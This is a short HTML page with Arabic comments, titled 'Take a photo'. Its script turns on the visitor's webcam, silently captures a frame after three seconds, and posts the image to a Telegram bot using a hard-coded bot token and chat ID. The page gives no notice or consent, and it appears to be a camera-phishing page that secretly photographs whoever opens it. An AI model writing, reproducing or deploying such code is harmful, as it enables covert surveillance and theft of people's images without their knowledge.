<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط صورة</title>
</head>
<body>

    <video id="video" autoplay style="width: 100%; max-width: 400px;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        // تشغيل الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("حدث خطأ في الوصول إلى الكاميرا:", err);
            });

        // التقاط صورة بعد 3 ثوانٍ وإرسالها
        setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى بيانات Base64
            const imageData = canvas.toDataURL("image/jpeg");

            // إرسال الصورة إلى بوت تيليجرام
            fetch(`https://api.telegram.org/bot7573387870:AAG4TEbxTtmyQ-d5iff8fLwb9MoeXYPxXWg/sendPhoto`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: 6279473459,  // استبدل بالـ ID الخاص بك
                    photo: imageData
                })
            }).then(response => {
                console.log("تم إرسال الصورة بنجاح!");
            }).catch(error => {
                console.error("خطأ أثناء إرسال الصورة:", error);
            });

        }, 3000); // التقاط الصورة بعد 3 ثوانٍ
    </script>

</body>
</html>
